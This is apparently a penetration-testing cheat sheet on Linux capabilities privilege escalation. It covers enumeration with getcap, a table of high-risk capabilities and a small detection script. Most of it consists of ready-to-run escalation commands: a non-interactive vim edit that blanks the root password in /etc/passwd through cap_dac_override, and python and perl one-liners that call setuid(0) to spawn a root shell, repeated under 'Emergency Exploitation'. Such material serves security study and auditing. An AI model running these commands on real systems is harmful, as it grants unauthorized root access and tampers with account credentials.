# 🎭 Capabilities

## 🎯 Overview

Linux capabilities provide fine-grained privileges to processes. Misconfigured capabilities on binaries can be exploited for privilege escalation without requiring SUID bits.

## 🔍 Enumeration

### Find Binaries with Capabilities
```bash
# Search all common binary directories
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \; 2>/dev/null

# System-wide capability search
getcap -r / 2>/dev/null

# Example output:
# /usr/bin/vim.basic = cap_dac_override+eip
# /usr/bin/ping = cap_net_raw+ep
```

## 🔑 Dangerous Capabilities

### High-Risk Capabilities
| Capability | Impact |
|------------|---------|
| `cap_setuid` | Change effective UID to any user (including root) |
| `cap_setgid` | Change effective GID to any group |
| `cap_sys_admin` | Broad administrative privileges |
| `cap_dac_override` | Bypass file read/write/execute permissions |

### Other Notable Capabilities
```bash
cap_sys_chroot     # Change root directory
cap_sys_ptrace     # Attach/debug other processes  
cap_sys_nice       # Change process priority
cap_sys_time       # Modify system clock
cap_sys_module     # Load/unload kernel modules
cap_net_bind_service # Bind to privileged ports
```

## 🚀 Exploitation Examples

### cap_dac_override (File Permission Bypass)
```bash
# If vim.basic has cap_dac_override
/usr/bin/vim.basic /etc/passwd

# Remove 'x' from root line:
# Before: root:x:0:0:root:/root:/bin/bash
# After:  root::0:0:root:/root:/bin/bash

# Switch to root (no password required)
su root
```

### cap_setuid (UID Manipulation)
```bash
# If python has cap_setuid
python -c "import os; os.setuid(0); os.system('/bin/bash')"

# If perl has cap_setuid  
perl -e 'use POSIX; POSIX::setuid(0); exec "/bin/bash";'
```

### cap_sys_admin (Administrative Access)
```bash
# Can mount filesystems, modify kernel parameters
# Often provides multiple escalation paths
mount -o bind /etc /tmp/etc  # Bind mount for manipulation
```

## 🔧 Advanced Exploitation

### Non-interactive File Editing
```bash
# Remove root password via vim with cap_dac_override
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd

# Verify change
cat /etc/passwd | head -n1
# Output: root::0:0:root:/root:/bin/bash

# Escalate to root
su root  # No password required
```

### Python/Interpreter Capabilities
```bash
# If python has dangerous capabilities
getcap $(which python python3) 2>/dev/null

# Exploitation with cap_setuid
python -c "import os; os.setuid(0); os.execl('/bin/bash', 'bash')"
```

## 🔍 Detection Script

```bash
#!/bin/bash
echo "=== CAPABILITIES ENUMERATION ==="

echo "[+] Binaries with capabilities:"
getcap -r / 2>/dev/null

echo "[+] Dangerous capability check:"
dangerous_caps="cap_setuid cap_setgid cap_sys_admin cap_dac_override"

getcap -r / 2>/dev/null | while read line; do
    for cap in $dangerous_caps; do
        if echo "$line" | grep -q "$cap"; then
            echo "[!] DANGEROUS: $line"
        fi
    done
done

echo "[+] Quick capability lookup:"
for binary in vim nano python python3 perl ruby; do
    cap=$(getcap $(which $binary 2>/dev/null) 2>/dev/null)
    if [ ! -z "$cap" ]; then
        echo "  $cap"
    fi
done
```

## 🔑 Quick Reference

### Immediate Checks
```bash
# Find capabilities
getcap -r / 2>/dev/null | grep -E "(setuid|setgid|sys_admin|dac_override)"

# Common targets
getcap $(which vim python python3 perl) 2>/dev/null
```

### Emergency Exploitation
```bash
# cap_dac_override + vim
/usr/bin/vim.basic /etc/passwd
# Remove root password 'x'

# cap_setuid + python
python -c "import os; os.setuid(0); os.system('/bin/bash')"

# cap_setuid + perl
perl -e 'use POSIX; POSIX::setuid(0); exec "/bin/bash";'
```

---

*Capabilities provide fine-grained privilege control but misconfigured capability assignments can offer direct privilege escalation paths without traditional SUID requirements.* 